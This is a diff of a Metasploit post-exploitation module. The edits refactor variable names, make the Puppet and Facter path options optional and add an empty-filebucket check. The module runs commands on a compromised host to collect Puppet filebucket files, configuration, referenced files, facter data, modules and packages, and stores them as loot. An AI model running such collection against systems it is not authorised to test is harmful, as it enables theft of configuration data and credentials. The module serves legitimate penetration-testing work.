@@ -35,8 +35,8 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptBool.new('FILEBUCKET', [false, 'Gather files from filebucket', true]),
-        OptString.new('PUPPET', [true, 'Puppet executable location', '']),
-        OptString.new('FACTER', [true, 'Facter executable location', ''])
+        OptString.new('PUPPET', [false, 'Puppet executable location']),
+        OptString.new('FACTER', [false, 'Facter executable location'])
       ], self.class
     )
   end
@@ -71,14 +71,16 @@ class MetasploitModule < Msf::Post
     print_good("Puppet Filebucket Servers: #{serverlist}") unless server_list.blank?
 
     file_list = cmd_exec("#{puppet_exe} filebucket -l list")
+    return if file_list.include? 'File not found'
+
     columns = ['Hash', 'Date', 'Filename', 'Loot location']
     table = Rex::Text::Table.new('Header' => 'Puppet Filebucket Files', 'Indent' => 1, 'Columns' => columns)
     file_list.lines.each do |file|
       file = file.split(' ')
       vprint_status("Retrieving filebucket contents: #{file[3]}")
       file_content = cmd_exec("puppet filebucket -l get #{file[0]}")
-      l = store_loot('puppet.filebucket', 'text/plain', session, file_content, file[3].split('/').last, 'Puppet filebucket stored file')
-      table << [file[0], "#{file[1]} #{file[2]}", file[3], l]
+      loot = store_loot('puppet.filebucket', 'text/plain', session, file_content, file[3].split('/').last, 'Puppet filebucket stored file')
+      table << [file[0], "#{file[1]} #{file[2]}", file[3], loot]
     end
     print_good(table.to_s) unless table.rows.empty?
   end
@@ -86,8 +88,8 @@ class MetasploitModule < Msf::Post
   def get_config
     # we prefer to run `puppet config print` over getting puppet.conf since it contains env items as well merged in
     config = cmd_exec("#{puppet_exe} config print")
-    l = store_loot('puppet.conf', 'text/plain', session, config, 'puppet.conf', 'Puppet config file')
-    print_good("Stored puppet config to: #{l}")
+    loot = store_loot('puppet.conf', 'text/plain', session, config, 'puppet.conf', 'Puppet config file')
+    print_good("Stored puppet config to: #{loot}")
     config_dict = {}
     config.lines.each do |line|
       line = line.split('=')
@@ -116,8 +118,8 @@ class MetasploitModule < Msf::Post
       end
 
       content = read_file(config_dict[field])
-      l = store_loot(config_dict[field], 'text/plain', session, content, config_dict[field])
-      table << [field, config_dict[field], l]
+      loot = store_loot(config_dict[field], 'text/plain', session, content, config_dict[field])
+      table << [field, config_dict[field], loot]
     end
 
     # http proxy things, skip if password wasn't set as theres nothing of value there. not set is 'none' for these fields
@@ -140,8 +142,8 @@ class MetasploitModule < Msf::Post
     columns = ['Module', 'Version']
     table = Rex::Text::Table.new('Header' => 'Puppet Modules', 'Indent' => 1, 'Columns' => columns)
     mods = cmd_exec("#{puppet_exe} module list")
-    l = store_loot('puppet.modules', 'text/plain', session, mods, 'Puppet modules list')
-    print_good("Stored facter to: #{l}")
+    loot = store_loot('puppet.modules', 'text/plain', session, mods, 'Puppet modules list')
+    print_good("Stored facter to: #{loot}")
     mods.lines.each do |line|
       next if line.start_with? '/' # showing paths of where things are installed to like '/etc/puppetlabs/code/modules (no modules installed)'
 
@@ -157,9 +159,9 @@ class MetasploitModule < Msf::Post
   def facter
     facter_json = cmd_exec("#{facter_exe} -j")
     facter_json = JSON.parse(facter_json)
-    l = store_loot('puppet.facter', 'text/plain', session, facter_json, 'puppet.facter', 'Puppet facter')
-    print_good("Stored facter to: #{l}")
-    # LOT of data here, prob a good idea to just fill out the system details that go in hosts
+    loot = store_loot('puppet.facter', 'text/plain', session, facter_json, 'puppet.facter', 'Puppet facter')
+    print_good("Stored facter to: #{loot}")
+    # There is a LOT of data here, it's probably a good idea to just fill out the system details that go in hosts
     host_info = { info: 'Running Puppet software configuration management tool' }
     host_info[:os_name] = facter_json.dig('os', 'distro', 'description') unless facter_json.dig('os', 'distro', 'description').nil?
     host_info[:os_sp] = facter_json.dig('os', 'distro', 'release', 'full') unless facter_json.dig('os', 'distro', 'release', 'full').nil?
@@ -179,8 +181,8 @@ class MetasploitModule < Msf::Post
 
   def puppet_packages
     packages = cmd_exec("#{puppet_exe} resource package")
-    l = store_loot('puppet.packages', 'text/plain', session, packages, 'puppet.packages', 'Puppet packages')
-    print_good("Stored packages to: #{l}")
+    loot = store_loot('puppet.packages', 'text/plain', session, packages, 'puppet.packages', 'Puppet packages')
+    print_good("Stored packages to: #{loot}")
     columns = ['Package', 'Version', 'Source']
     table = Rex::Text::Table.new('Header' => 'Puppet Packages', 'Indent' => 1, 'Columns' => columns)
     # this is in puppet DSL, and likely to change. However here's a regex with test: https://rubular.com/r/1sGTiW2mBkislO
